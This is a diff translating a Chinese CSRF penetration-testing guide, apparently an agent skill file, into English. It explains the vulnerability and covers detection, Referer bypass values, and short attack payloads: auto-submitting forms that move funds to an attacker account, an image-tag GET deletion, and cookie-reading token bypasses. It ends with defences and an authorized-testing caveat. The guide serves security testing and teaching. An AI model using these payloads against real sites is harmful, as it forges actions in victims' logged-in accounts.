@@ -1,36 +1,36 @@
 ---
 name: csrf-testing
-description: CSRF跨站请求伪造测试的专业技能和方法论
+Description: Professional skills and methodology for CSRF cross-site request forgery testing
 version: 1.0.0
 ---
 
-# CSRF跨站请求伪造测试
+# CSRF cross-site request forgery test
 
-## 概述
+## Overview
 
-CSRF（Cross-Site Request Forgery）是一种利用用户已登录状态进行未授权操作的攻击方式。本技能提供CSRF漏洞的检测、利用和防护方法。
+CSRF (Cross-Site Request Forgery) is an attack method that uses the user's logged-in status to perform unauthorized operations. This skill provides detection, utilization and protection methods for CSRF vulnerabilities.
 
-## 漏洞原理
+## Vulnerability principle
 
-- 攻击者诱导用户访问恶意页面
-- 恶意页面自动发送请求到目标网站
-- 浏览器自动携带用户的认证信息（Cookie、Session）
-- 目标网站误认为是用户合法操作
+- Attackers induce users to visit malicious pages
+- The malicious page automatically sends a request to the target website
+- The browser automatically carries the user's authentication information (Cookie, Session)
+- The target website mistakenly believes that the user is operating legitimately
 
-## 测试方法
+## Test method
 
-### 1. 识别敏感操作
+### 1. Identify sensitive operations
 
-- 密码修改
-- 邮箱修改
-- 转账操作
-- 权限变更
-- 数据删除
-- 状态更新
+- Password change
+- Email modification
+- Transfer operations
+- Permission changes
+- Data deletion
+- Status updates
 
-### 2. 检测CSRF Token
+### 2. Detect CSRF Token
 
-**检查是否有Token保护：**
+**Check if there is Token protection:**
 ```html
 <!-- 有Token保护 -->
 <form method="POST" action="/change-password">
@@ -44,32 +44,32 @@ CSRF（Cross-Site Request Forgery）是一种利用用户已登录状态进行�
 </form>
 ```
 
-### 3. 验证Token有效性
+### 3. Verify Token validity
 
-**测试Token是否可预测：**
-- Token是否基于时间戳
-- Token是否基于用户ID
-- Token是否可重复使用
-- Token是否在多个请求间共享
+**Test whether the Token is predictable:**
+- Whether the Token is based on timestamp
+- Whether the token is based on user ID
+- Whether the Token can be reused
+- Whether the token is shared between multiple requests
 
-### 4. 检查Referer验证
+### 4. Check Referer verification
 
-**测试Referer检查是否可绕过：**
+**Test Referer check to see if it can be bypassed:**
 ```javascript
-// 正常请求
+// Normal request
 Referer: https://target.com/change-password
 
-// 测试绕过
+// Test bypass
 Referer: https://target.com.evil.com
 Referer: https://evil.com/?target.com
-Referer: (空)
+Referer: (empty)
 ```
 
-## 利用技术
+## Leverage technology
 
-### 基础CSRF攻击
+### Basic CSRF attack
 
-**HTML表单自动提交：**
+**HTML form automatic submission:**
 ```html
 <form action="https://target.com/api/transfer" method="POST" id="csrf">
   <input type="hidden" name="to" value="attacker_account">
@@ -80,7 +80,7 @@ Referer: (空)
 
 ### JSON CSRF
 
-**绕过Content-Type检查：**
+**Bypass Content-Type check:**
 ```html
 <!-- 使用form表单提交JSON -->
 <form action="https://target.com/api/update" method="POST" enctype="text/plain">
@@ -89,44 +89,44 @@ Referer: (空)
 <script>document.forms[0].submit();</script>
 ```
 
-### GET请求CSRF
+### GET request CSRF
 
-**利用GET请求进行攻击：**
+**Attack using GET request:**
 ```html
 <img src="https://target.com/api/delete?id=123">
 ```
 
-## 绕过技术
+## Bypass technology
 
-### Token绕过
+### Token bypass
 
-**如果Token在Cookie中：**
+**If Token is in Cookie:**
 ```javascript
-// 如果Token同时存在于Cookie和表单中
-// 可以尝试只提交Cookie中的Token
+// If the Token exists in both the cookie and the form
+// You can try to submit only the Token in the cookie
 fetch('https://target.com/api/action', {
   method: 'POST',
   credentials: 'include',
   body: 'action=delete&id=123'
-  // 不包含csrf_token参数，依赖Cookie
+  // Does not contain the csrf_token parameter and relies on Cookie
 });
 ```
 
-### SameSite Cookie绕过
+### SameSite Cookie Bypass
 
-**利用子域名：**
-- 如果SameSite=Lax，GET请求仍可携带Cookie
-- 利用子域名进行攻击
+**Utilizing subdomains:**
+- If SameSite=Lax, GET requests can still carry cookies
+- Attack using subdomain names
 
-### 双重提交Cookie
+### Double submission cookie
 
-**绕过Token验证：**
+**Bypass Token verification:**
 ```html
 <!-- 如果Token在Cookie中，且验证逻辑有缺陷 -->
 <form action="https://target.com/api/action" method="POST">
   <input type="hidden" name="csrf_token" value="">
   <script>
-    // 从Cookie中读取Token
+    // Read Token from Cookie
     document.cookie.split(';').forEach(c => {
       if(c.trim().startsWith('csrf_token=')) {
         document.querySelector('input[name="csrf_token"]').value = 
@@ -137,63 +137,63 @@ fetch('https://target.com/api/action', {
 </form>
 ```
 
-## 工具使用
+## Tool usage
 
 ### Burp Suite
 
-**使用CSRF PoC生成器：**
-1. 拦截目标请求
-2. 右键 → Engagement tools → Generate CSRF PoC
-3. 测试生成的PoC
+**Use CSRF PoC Generator:**
+1. Intercept target requests
+2. Right click → Engagement tools → Generate CSRF PoC
+3. Test the generated PoC
 
 ### OWASP ZAP
 
 ```bash
-# 使用ZAP进行CSRF扫描
+# Use ZAP for CSRF scanning
 zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
 ```
 
-## 验证和报告
+## Validation and reporting
 
-### 验证步骤
+### Verification steps
 
-1. 确认目标操作没有CSRF Token保护
-2. 构造恶意请求并验证可执行
-3. 评估影响（数据泄露、权限提升、资金损失等）
-4. 记录完整的POC
+1. Confirm that the target operation is not protected by CSRF Token
+2. Construct a malicious request and verify that it is executable
+3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
+4. Record a complete POC
 
-### 报告要点
+### Report Highlights
 
-- 漏洞位置和受影响的操作
-- 攻击场景和影响范围
-- 完整的利用步骤和PoC
-- 修复建议（CSRF Token、SameSite Cookie、Referer验证等）
+- Location of the vulnerability and affected operations
+- Attack scenarios and scope of impact
+- Complete exploitation steps and PoC
+- Repair suggestions (CSRF Token, SameSite Cookie, Referer verification, etc.)
 
-## 防护措施
+## Protective measures
 
-### 推荐方案
+### Recommended plan
 
 1. **CSRF Token**
-   - 每个表单包含唯一Token
-   - Token存储在Session中
-   - 验证Token有效性
+- Each form contains a unique Token
+-Token is stored in Session
+- Verify Token validity
 
 2. **SameSite Cookie**
    ```javascript
    Set-Cookie: session=abc123; SameSite=Strict; Secure
    ```
 
-3. **双重提交Cookie**
-   - Token同时存在于Cookie和表单
-   - 验证两者是否匹配
+3. **Double Submit Cookie**
+- Token exists in both cookies and forms
+- Verify that both match
 
-4. **Referer验证**
-   - 验证Referer是否为同源
-   - 注意空Referer的处理
+4. **Referer verification**
+- Verify whether the Referer is of the same origin
+- Pay attention to the handling of empty Referer
 
-## 注意事项
+## Notes
 
-- 仅在授权测试环境中进行
-- 避免对用户账户造成实际影响
-- 记录所有测试步骤
-- 考虑不同浏览器的行为差异
+- Only conducted in an authorized testing environment
+- Avoid any real impact on user accounts
+- Document all testing steps
+- Consider differences in behavior across browsers
